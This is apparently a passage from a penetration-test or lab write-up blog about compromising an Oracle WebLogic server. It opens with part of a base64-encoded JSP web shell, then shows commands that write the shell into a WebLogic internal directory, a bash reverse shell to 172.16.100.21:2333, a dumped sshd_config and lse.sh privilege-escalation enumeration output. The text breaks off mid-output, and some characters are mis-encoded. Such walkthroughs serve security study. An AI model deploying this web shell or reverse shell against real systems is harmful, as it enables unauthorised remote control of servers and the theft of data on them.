pbmcuY2xhc3MgfSkuaW52b2tlKGRlY29kZXIsIG5ldyBPYmplY3RbXSB7IGJzIH0pO30gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7dHJ5IHsgYmFzZTY0PUNsYXNzLmZvck5hbWUoInN1bi5taXNjLkJBU0U2NERlY29kZXIiKTsgT2JqZWN0IGRlY29kZXIgPSBiYXNlNjQubmV3SW5zdGFuY2UoKTsgdmFsdWUgPSAoYnl0ZVtdKWRlY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImRlY29kZUJ1ZmZlciIsIG5ldyBDbGFzc1tdIHsgU3RyaW5nLmNsYXNzIH0pLmludm9rZShkZWNvZGVyLCBuZXcgT2JqZWN0W10geyBicyB9KTt9IGNhdGNoIChFeGNlcHRpb24gZTIpIHt9fXJldHVybiB2YWx1ZTsgfSU+PCV0cnl7Ynl0ZVtdIGRhdGE9YmFzZTY0RGVjb2RlKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKHBhc3MpKTtkYXRhPXgoZGF0YSwgZmFsc2UpO2lmIChzZXNzaW9uLmdldEF0dHJpYnV0ZSgicGF5bG9hZCIpPT1udWxsKXtzZXNzaW9uLnNldEF0dHJpYnV0ZSgicGF5bG9hZCIsbmV3IFgodGhpcy5nZXRDbGFzcygpLmdldENsYXNzTG9hZGVyKCkpLlEoZGF0YSkpO31lbHNle3JlcXVlc3Quc2V0QXR0cmlidXRlKCJwYXJhbWV0ZXJzIixkYXRhKTtqYXZhLmlvLkJ5dGVBcnJheU91dHB1dFN0cmVhbSBhcnJPdXQ9bmV3IGphdmEuaW8uQnl0ZUFycmF5T3V0cHV0U3RyZWFtKCk7T2JqZWN0IGY9KChDbGFzcylzZXNzaW9uLmdldEF0dHJpYnV0ZSgicGF5bG9hZCIpKS5uZXdJbnN0YW5jZSgpO2YuZXF1YWxzKGFyck91dCk7Zi5lcXVhbHMocGFnZUNvbnRleHQpO3Jlc3BvbnNlLmdldFdyaXRlcigpLndyaXRlKG1kNS5zdWJzdHJpbmcoMCwxNikpO2YudG9TdHJpbmcoKTtyZXNwb25zZS5nZXRXcml0ZXIoKS53cml0ZShiYXNlNjRFbmNvZGUoeChhcnJPdXQudG9CeXRlQXJyYXkoKSwgdHJ1ZSkpKTtyZXNwb25zZS5nZXRXcml0ZXIoKS53cml0ZShtZDUuc3Vic3RyaW5nKDE2KSk7fSB9Y2F0Y2ggKEV4Y2VwdGlvbiBlKXt9IAolPg==</p><p>echo PCUhIFN0 |base64 -d &gt; /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/a.jsp<br>cat /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/a.jsp</p><p><a href="http://172.16.100.21:7001/bea_wls_internal/a.jsp">http://172.16.100.21:7001/bea_wls_internal/a.jsp</a></p><p>echo â€˜aâ€™ &gt; /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/a.jsp</p><p>mysql -h 172.17.20.250 -u typecho -p</p><p>bash -i &gt;&amp; /dev/tcp/172.16.100.21/2333 0&gt;&amp;1</p><p> This is the sshd server system-wide configuration file.  See<br> sshd_config(5) for more information.</p><p> This sshd was compiled with PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games</p><p> The strategy used for options in the default sshd_config shipped with<br> OpenSSH is to specify options with their default value where<br> possible, but leave them commented.  Uncommented options override the<br> default value.</p><p>Include /etc/ssh/sshd_config.d/*.conf</p><p>Port 22<br>AddressFamily any<br>ListenAddress 0.0.0.0<br>ListenAddress ::</p><p>HostKey /etc/ssh/ssh_host_rsa_key<br>HostKey /etc/ssh/ssh_host_ecdsa_key<br>HostKey /etc/ssh/ssh_host_ed25519_key</p><p> Ciphers and keying<br>RekeyLimit default none</p><p> Logging<br>SyslogFacility AUTH<br>LogLevel INFO</p><p> Authentication:</p><p>LoginGraceTime 2m<br>PermitRootLogin prohibit-password<br>StrictModes yes<br>MaxAuthTries 6<br>MaxSessions 10</p><p>PubkeyAuthentication yes</p><p> Expect .ssh/authorized_keys2 to be disregarded by default in future.<br>AuthorizedKeysFile    .ssh/authorized_keys .ssh/authorized_keys2</p><p>AuthorizedPrincipalsFile none</p><p>AuthorizedKeysCommand none<br>AuthorizedKeysCommandUser nobody</p><p> For this to work you will also need host keys in /etc/ssh/ssh_known_hosts<br>HostbasedAuthentication no<br> Change to yes if you don&apos;t trust ~/.ssh/known_hosts for<br> HostbasedAuthentication<br>IgnoreUserKnownHosts no<br> Don&apos;t read the user&apos;s ~/.rhosts and ~/.shosts files<br>IgnoreRhosts yes</p><p> To disable tunneled clear text passwords, change to no here!<br>PasswordAuthentication yes<br>PermitEmptyPasswords no</p><p> Change to yes to enable challenge-response passwords (beware issues with<br> some PAM modules and threads)<br>KbdInteractiveAuthentication no</p><p> Kerberos options<br>KerberosAuthentication no<br>KerberosOrLocalPasswd yes<br>KerberosTicketCleanup yes<br>KerberosGetAFSToken no</p><p> GSSAPI options<br>GSSAPIAuthentication no<br>GSSAPICleanupCredentials yes<br>GSSAPIStrictAcceptorCheck yes<br>GSSAPIKeyExchange no</p><p> Set this to &apos;yes&apos; to enable PAM authentication, account processing,<br> and session processing. If this is enabled, PAM authentication will<br> be allowed through the KbdInteractiveAuthentication and<br> PasswordAuthentication.  Depending on your PAM configuration,<br> PAM authentication via KbdInteractiveAuthentication may bypass<br> the setting of &quot;PermitRootLogin without-password&quot;.<br> If you just want the PAM account and session checks to run without<br> PAM authentication, then enable this but set PasswordAuthentication<br> and KbdInteractiveAuthentication to &apos;no&apos;.<br>UsePAM yes</p><p>AllowAgentForwarding yes<br>AllowTcpForwarding yes<br>GatewayPorts no<br>X11Forwarding yes<br>X11DisplayOffset 10<br>X11UseLocalhost yes<br>PermitTTY yes<br>PrintMotd no<br>PrintLastLog yes<br>TCPKeepAlive yes<br>PermitUserEnvironment no<br>Compression delayed<br>ClientAliveInterval 0<br>ClientAliveCountMax 3<br>UseDNS no<br>PidFile /run/sshd.pid<br>MaxStartups 10:30:100<br>PermitTunnel no<br>ChrootDirectory none<br>VersionAddendum none</p><p> no default banner path<br>Banner none</p><p> Allow client to pass locale environment variables<br>AcceptEnv LANG LC_*</p><p> override default of no subsystems<br>Subsystem sftp    /usr/lib/openssh/sftp-server</p><p> Example of overriding settings on a per-user basis<br>Match User anoncvs<br>    X11Forwarding no<br>    AllowTcpForwarding no<br>    PermitTTY no<br>    ForceCommand cvs server<br>PasswordAuthentication yes</p><h2 id="lse-sh"><a href="#lse-sh" class="headerlink" title="$ ./lse.sh"></a>$ ./lse.sh</h2><h2 id="If-you-know-the-current-user-password-write-it-here-to-check-sudo-privileges"><a href="#If-you-know-the-current-user-password-write-it-here-to-check-sudo-privileges" class="headerlink" title="If you know the current user password, write it here to check sudo privileges:"></a>If you know the current user password, write it here to check sudo privileges:</h2><p> LSE Version: 4.5nw</p><pre><code>    User: acequan User ID: 1000Password: none    Home: /home/acequan    Path: /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/bin:/home/acequan/Oracle/Middleware/                                                                                     Oracle_Home/wlserver/server/bin:/home/acequan/Oracle/Middleware/Oracle_Home/wlserver/../oracle_common/modules/thirdparty/org.a                                                                                     pache.ant/1.10.5.0.0/apache-ant-1.10.5/bin:/usr/lib/jvm/jre/bin:/usr/lib/jvm/bin:/usr/lib/jvm/bin:/usr/local/sbin:/usr/local/b                                                                                     in:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/snap/bin   umask: 0027Hostname: meetsec-devserver   Linux: 5.15.0-43-generic</code></pre><p>Distribution: Ubuntu 22.04.1 LTS<br>Architecture: x86_64</p><p>=====================( Current Output Verbosity Level: 0 )======================<br>===============================================================( humanity )=====<br>[!] nowar0 Should we question autocrats and their â€œmilitary operationsâ€?â€¦ yes!</p><hr><pre><code>                                  NO                                  WAR</code></pre><hr><p>==================================================================( users )=====<br>[i] usr000 Current user groupsâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ yes!<br>[<em>] usr010 Is current user in an administrative group?â€¦â€¦â€¦â€¦â€¦â€¦â€¦ yes!<br>[</em>] usr020 Are there other users in administrative groups?â€¦â€¦â€¦â€¦â€¦.. yes!<br>[<em>] usr030 Other users with shellâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ yes!<br>[i] usr040 Environment informationâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. skip<br>[i] usr050 Groups for other usersâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>[i] usr060 Other usersâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. skip<br>[</em>] usr070 PATH variables defined inside /etcâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ yes!<br>[!] usr080 Is â€˜.â€™ in a PATH variable defined inside /etc?â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>===================================================================( sudo )=====<br>[!] sud000 Can we sudo without a password?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[!] sud010 Can we list sudo commands without a password?â€¦â€¦â€¦â€¦â€¦â€¦. nope<br>[<em>] sud040 Can we read sudoers files?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[</em>] sud050 Do we know if any other users used sudo?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ yes!<br>============================================================( file system )=====<br>[<em>] fst000 Writable files outside userâ€™s homeâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ yes!<br>[</em>] fst010 Binaries with setuid bitâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. yes!<br>[!] fst020 Uncommon setuid binariesâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. yes!</p><hr><p>/snap/snapd/17029/usr/lib/snapd/snap-confine<br>/snap/snapd/17336/usr/lib/snapd/snap-confine</p><hr><p>[!] fst030 Can we write to any setuid binary?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[<em>] fst040 Binaries with setgid bitâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. skip<br>[!] fst050 Uncommon setgid binariesâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. skip<br>[!] fst060 Can we write to any setgid binary?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>[</em>] fst070 Can we read /root?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. nope<br>[<em>] fst080 Can we read subdirectories under /home?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. nope<br>[</em>] fst090 SSH files in home directoriesâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[<em>] fst100 Useful binariesâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. yes!<br>[</em>] fst110 Other interesting files in home directoriesâ€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[!] fst120 Are there any credentials in fstab/mtab?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[<em>] fst130 Does â€˜acequanâ€™ have mail?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[!] fst140 Can we access other users mail?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[</em>] fst150 Looking for GIT/SVN repositoriesâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[!] fst160 Can we write to critical files?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[!] fst170 Can we write to critical directories?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[!] fst180 Can we write to directories from PATH defined in /etc?â€¦â€¦â€¦. nope<br>[!] fst190 Can we read any backup?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. yes!</p><hr><p>-rw-râ€”â€“ 1 acequan acequan 35786 11æœˆ  8 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.3.zip<br>-rw-râ€”â€“ 1 acequan acequan 35786 11æœˆ  9 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.2.zip<br>-rw-râ€”â€“ 1 acequan acequan 35786 11æœˆ  5 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.6.zip<br>-rw-râ€”â€“ 1 acequan acequan 35786 11æœˆ  7 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.4.zip<br>-rw-râ€”â€“ 1 acequan acequan 35786 11æœˆ 11 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.0.zip<br>-rw-râ€”â€“ 1 acequan acequan 35786 11æœˆ 10 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.1.zip<br>-rw-râ€”â€“ 1 acequan acequan 35786 11æœˆ 12 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.zip<br>-rw-râ€”â€“ 1 acequan acequan 35786 11æœˆ  6 23:05 /home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/data/ldap/backup/EmbeddedLDAPBackup.5.zip</p><hr><p>[!] fst200 Are there possible credentials in any shell history file?â€¦â€¦. nope<br>[!] fst210 Are there NFS exports with â€˜no_root_squashâ€™ option?â€¦â€¦â€¦â€¦. nope<br>[<em>] fst220 Are there NFS exports with â€˜no_all_squashâ€™ option?â€¦â€¦â€¦â€¦.. nope<br>[i] fst500 Files owned by user â€˜acequanâ€™â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. skip<br>[i] fst510 SSH files anywhereâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. skip<br>[i] fst520 Check hosts.equiv file and its contentsâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. skip<br>[i] fst530 List NFS server sharesâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>[i] fst540 Dump fstab fileâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. skip<br>=================================================================( system )=====<br>[i] sys000 Who is logged inâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>[i] sys010 Last logged in usersâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. skip<br>[!] sys020 Does the /etc/passwd have hashes?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. nope<br>[!] sys022 Does the /etc/group have hashes?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[!] sys030 Can we read shadow files?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[</em>] sys040 Check for other superuser accountsâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[<em>] sys050 Can root user log in via SSH?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[i] sys060 List available shellsâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. skip<br>[i] sys070 System umask in /etc/login.defsâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>[i] sys080 System password policies in /etc/login.defsâ€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>===============================================================( security )=====<br>[</em>] sec000 Is SELinux present?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[<em>] sec010 List files with capabilitiesâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ yes!<br>[!] sec020 Can we write to a binary with caps?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[!] sec030 Do we have all caps in any binary?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[</em>] sec040 Users with associated capabilitiesâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[!] sec050 Does current user have capabilities?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. skip<br>[!] sec060 Can we read the auditd log?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. nope<br>========================================================( recurrent tasks )=====<br>[<em>] ret000 User crontabâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. nope<br>[!] ret010 Cron tasks writable by userâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. nope<br>[</em>] ret020 Cron jobsâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. yes!<br>[<em>] ret030 Can we read user crontabsâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[</em>] ret040 Can we list other user cron tasks?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[<em>] ret050 Can we write to any paths present in cron jobsâ€¦â€¦â€¦â€¦â€¦â€¦ yes!<br>[!] ret060 Can we write to executable paths present in cron jobsâ€¦â€¦â€¦.. nope<br>[i] ret400 Cron filesâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>[</em>] ret500 User systemd timersâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[!] ret510 Can we write in any system timer?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. nope<br>[i] ret900 Systemd timersâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. skip<br>================================================================( network )=====<br>[<em>] net000 Services listening only on localhostâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. yes!<br>[!] net010 Can we sniff traffic with tcpdump?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[i] net500 NIC and IP informationâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>[i] net510 Routing tableâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>[i] net520 ARP tableâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. skip<br>[i] net530 Nameserversâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. skip<br>[i] net540 Systemd Nameserversâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>[i] net550 Listening TCPâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>[i] net560 Listening UDPâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>===============================================================( services )=====<br>[!] srv000 Can we write in service files?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. nope<br>[!] srv010 Can we write in binaries executed by services?â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[</em>] srv020 Files in /etc/init.d/ not belonging to rootâ€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[<em>] srv030 Files in /etc/rc.d/init.d not belonging to rootâ€¦â€¦â€¦â€¦â€¦.. nope<br>[</em>] srv040 Upstart files not belonging to rootâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[<em>] srv050 Files in /usr/local/etc/rc.d not belonging to rootâ€¦â€¦â€¦â€¦.. nope<br>[i] srv400 Contents of /etc/inetd.confâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. skip<br>[i] srv410 Contents of /etc/xinetd.confâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>[i] srv420 List /etc/xinetd.d if usedâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. skip<br>[i] srv430 List /etc/init.d/ permissionsâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. skip<br>[i] srv440 List /etc/rc.d/init.d permissionsâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. skip<br>[i] srv450 List /usr/local/etc/rc.d permissionsâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. skip<br>[i] srv460 List /etc/init/ permissionsâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. skip<br>[!] srv500 Can we write in systemd service files?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[!] srv510 Can we write in binaries executed by systemd services?â€¦â€¦â€¦. nope<br>[</em>] srv520 Systemd files not belonging to rootâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[i] srv900 Systemd config files permissionsâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. skip<br>===============================================================( software )=====<br>[!] sof000 Can we connect to MySQL with root/root credentials?â€¦â€¦â€¦â€¦. nope<br>[!] sof010 Can we connect to MySQL as root without password?â€¦â€¦â€¦â€¦â€¦ nope<br>[!] sof015 Are there credentials in mysql_history file?â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope<br>[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope<br>[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?â€¦.. nope<br>[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?â€¦.. nope<br>[*] sof030 Installed apache modulesâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. nope<br>[!] sof040 Found any .htpasswd files?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[!] sof050 Are there private keys in ssh-agent?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. nope<br>[!] sof060 Are there gpg keys cached in gpg-agent?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. nope<br>[!] sof070 Can we write to a ssh-agent socket?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope</p><h2 id="sof080-Can-we-write-to-a-gpg-agent-socket-â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦-yes"><a href="#sof080-Can-we-write-to-a-gpg-agent-socket-â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦-yes" class="headerlink" title="[!] sof080 Can we write to a gpg-agent socket?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. yes!"></a>[!] sof080 Can we write to a gpg-agent socket?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. yes!</h2><p>/run/user/1000/gnupg/S.gpg-agent<br>/run/user/1000/gnupg/S.gpg-agent.ssh<br>/run/user/1000/gnupg/S.gpg-agent.extra<br>/run/user/1000/gnupg/S.gpg-agent.browser</p><hr><p>[!] sof090 Found any keepass database files?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. nope<br>[!] sof100 Found any â€˜passâ€™ store directories?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[!] sof110 Are there any tmux sessions available?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[<em>] sof120 Are there any tmux sessions from other users?â€¦â€¦â€¦â€¦â€¦â€¦. nope<br>[!] sof130 Can we write to tmux session sockets from other users?â€¦â€¦â€¦. nope<br>[!] sof140 Are any screen sessions available?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[</em>] sof150 Are there any screen sessions from other users?â€¦â€¦â€¦â€¦â€¦.. nope<br>[!] sof160 Can we write to screen session sockets from other users?â€¦â€¦.. nope<br>[<em>] sof170 Can we access MongoDB databases without credentials?â€¦â€¦â€¦â€¦ nope<br>[i] sof500 Sudo versionâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. skip<br>[i] sof510 MySQL versionâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>[i] sof520 Postgres versionâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>[i] sof530 Apache versionâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. skip<br>[i] sof540 Tmux versionâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. skip<br>[i] sof550 Screen versionâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. skip<br>=============================================================( containers )=====<br>[</em>] ctn000 Are we in a docker container?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[<em>] ctn010 Is docker available?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[!] ctn020 Is the user a member of the â€˜dockerâ€™ group?â€¦â€¦â€¦â€¦â€¦â€¦â€¦ nope<br>[</em>] ctn200 Are we in a lxc container?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[!] ctn210 Is the user a member of any lxc/lxd group?â€¦â€¦â€¦â€¦â€¦â€¦â€¦. yes!</p><hr><h2 id="acequan-adm-cdrom-sudo-dip-plugdev-lpadmin-lxd-sambashare"><a href="#acequan-adm-cdrom-sudo-dip-plugdev-lpadmin-lxd-sambashare" class="headerlink" title="acequan adm cdrom sudo dip plugdev lpadmin lxd sambashare"></a>acequan adm cdrom sudo dip plugdev lpadmin lxd sambashare</h2><p>==============================================================( processes )=====<br>[i] pro000 Waiting for the process monitor to finishâ€¦â€¦â€¦â€¦â€¦â€¦â€¦.. yes!<br>[i] pro001 Retrieving process binariesâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. yes!<br>[i] pro002 Retrieving process usersâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. yes!<br>[!] pro010 Can we write in any process binary?â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. nope<br>[<em>] pro020 Processes running with root permissionsâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦. yes!<br>[</em>] pro030 Processes running by non-root users with shellâ€¦â€¦â€¦â€¦â€¦â€¦ yes!<br>[i] pro500 Running processesâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦.. skip<br>[i] pro510 Running process binaries and permissionsâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦ skip<br>===================================================================( 